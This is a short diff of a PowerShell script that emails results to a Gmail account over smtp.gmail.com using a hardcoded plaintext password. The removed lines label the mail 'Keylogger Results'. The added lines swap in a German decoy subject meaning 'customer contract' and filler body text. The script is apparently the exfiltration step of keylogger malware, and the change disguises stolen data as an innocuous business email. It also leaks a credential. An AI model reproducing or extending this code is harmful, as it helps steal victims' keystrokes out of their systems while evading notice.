@@ -1,8 +1,8 @@
 $From = "madman1237890026525@gmail.com"
 $Pass = "Madman009"
 $To = "madman1237890026525@gmail.com"
-$Subject = "Keylogger Results"
-$body = "Keylogger Results"
+$Subject = "Kundenvertrag"
+$body = "Bla bla bla voll viel Text"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
